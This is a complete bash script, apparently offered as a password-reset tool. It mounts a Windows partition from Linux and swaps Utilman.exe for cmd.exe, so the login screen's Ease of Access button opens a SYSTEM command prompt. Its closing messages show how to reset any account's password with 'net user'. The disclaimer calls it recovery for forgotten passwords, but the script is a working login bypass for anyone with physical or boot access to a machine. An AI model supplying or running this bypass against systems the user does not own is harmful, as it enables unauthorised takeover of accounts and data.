#!/bin/bash
# 
# Script: winpass.sh
# Description: Swap Utilman.exe with cmd.exe on a Windows partition for password reset.
# Usage: sudo ./winpass.sh /dev/sdXY
#
# Winpass bypass by leomuguchia
#
# Disclaimer:
# This script is intended to be run on a Linux live mode or Linux distribution.
# It allows the user to gain access to a command prompt session before logging into a user account.
# This can help users change their password if they have forgotten it.
# This script is NOT intended for malicious purposes. Users are responsible for their actions.
# Ensure that Linux is either installed on the same disk or a different disk, as long as the Windows
# partition that needs bypassing is accessible.
#
# Note: Make this script executable before running it:
# chmod +x winpass.sh

# Display script information
echo "Winpass Bypass by leomuguchia"
echo "This script swaps Utilman.exe with cmd.exe on a Windows partition, allowing you to reset a password."
echo "Run this script responsibly. Misuse is strictly discouraged."
echo

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root. Use sudo." >&2
    exit 1
fi

# Check if the device argument is provided
if [ -z "$1" ]; then
    echo "Usage: $0 /dev/sdXY" >&2
    exit 1
fi

WINDOWS_PARTITION=$1
MOUNT_POINT="/mnt/windows"

# Create mount point
sudo mkdir -p "$MOUNT_POINT"

# Mount the Windows partition
sudo mount -o rw "$WINDOWS_PARTITION" "$MOUNT_POINT"
if [ $? -ne 0 ]; then
    echo "Failed to mount $WINDOWS_PARTITION." >&2
    exit 1
fi

echo "Mounted $WINDOWS_PARTITION at $MOUNT_POINT."

# Define paths
UTILMAN_PATH="$MOUNT_POINT/Windows/System32/Utilman.exe"
CMD_PATH="$MOUNT_POINT/Windows/System32/cmd.exe"
BACKUP_PATH="$MOUNT_POINT/Windows/System32/Utilman.bak"

# Backup the original Utilman.exe
if [ -f "$UTILMAN_PATH" ]; then
    sudo mv "$UTILMAN_PATH" "$BACKUP_PATH"
    echo "Backed up Utilman.exe to Utilman.bak."
else
    echo "Utilman.exe not found at $UTILMAN_PATH." >&2
    sudo umount "$MOUNT_POINT"
    exit 1
fi

# Replace Utilman.exe with cmd.exe
if [ -f "$CMD_PATH" ]; then
    sudo cp "$CMD_PATH" "$UTILMAN_PATH"
    echo "Replaced Utilman.exe with cmd.exe."
else
    echo "cmd.exe not found at $CMD_PATH." >&2
    # Restore Utilman if replacement fails
    sudo mv "$BACKUP_PATH" "$UTILMAN_PATH"
    echo "Restored original Utilman.exe."
    sudo umount "$MOUNT_POINT"
    exit 1
fi

# Unmount the partition
sudo umount "$MOUNT_POINT"
if [ $? -eq 0 ]; then
    echo "Unmounted $WINDOWS_PARTITION successfully."
else
    echo "Failed to unmount $WINDOWS_PARTITION." >&2
    exit 1
fi

# Completion message
echo "Utilman.exe has been replaced with cmd.exe."
echo "Reboot into Windows, click the Ease of Access icon, and type the following command to reset your password:"
echo "net user <username> <newpassword>"
echo "For example: net user Administrator MyNewPassword123"
echo "Once done, consider restoring the original Utilman.exe for system integrity."

exit 0
